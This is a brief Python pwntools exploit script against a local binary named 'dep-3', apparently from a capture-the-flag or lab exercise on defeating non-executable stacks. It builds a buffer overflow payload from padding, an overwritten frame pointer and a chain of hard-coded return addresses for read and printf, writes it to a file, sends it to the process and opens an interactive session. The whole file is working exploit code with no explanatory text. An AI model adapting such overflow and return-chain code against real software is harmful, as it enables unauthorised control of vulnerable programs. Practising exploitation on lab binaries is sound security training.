#! /usr/bin/env python

from pwn import *

p = process ('./dep-3')

print (p.recv())

#gdb.attach(p)

context.terminal = ['tmux', 'splitw', '-h']


addr_some_function = 0x8048894
addr_read = 0x806d2a0
addr_printf = 0x804ede0

addr_buf = 0xffffc35c

buffer = "A" * 0x88 + p32(0xffffd538) + p32(addr_some_function) + p32(addr_read) + p32(addr_printf) + p32(3) + p32(addr_buf) + p32(0x100)

f = open("c.txt", "w")
f.write(buffer)
f.close()

#p.sendline(buffer)
#p.wait()

#c = Core('./core')

#buffer_addr = c.stack.find(buffer)

#print(hex(buffer_addr))

#buffer = p32(some_function)
#while (len(buffer)) < 0x100:
#    buffer += p32(some_function)


p.sendline(buffer)
print(p.recv())

p.interactive()
